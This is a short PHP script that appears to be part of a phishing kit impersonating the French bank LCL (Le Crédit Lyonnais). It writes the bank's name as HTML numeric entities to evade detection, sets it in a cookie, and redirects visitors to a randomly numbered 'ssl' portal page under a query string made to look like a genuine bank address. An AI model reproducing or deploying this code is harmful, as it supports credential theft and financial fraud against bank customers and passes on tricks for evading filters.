<?php 
	$titulo = "&#76;&#67;&#76; - &#76;e &#67;r&#233;dit &#76;yo&#110;&#110;ais ";
	setCookie("titulo",$titulo,(time() + (24 * 3600)));
	$n = rand(0,999);
	$pagina ="portal/ssl".$n.".php?safe=compte-service-etablissements-reseau-Etablissements-assurancessafe=07548a0b3241f8791b4130647453ee66";
	header("location: ".$pagina);
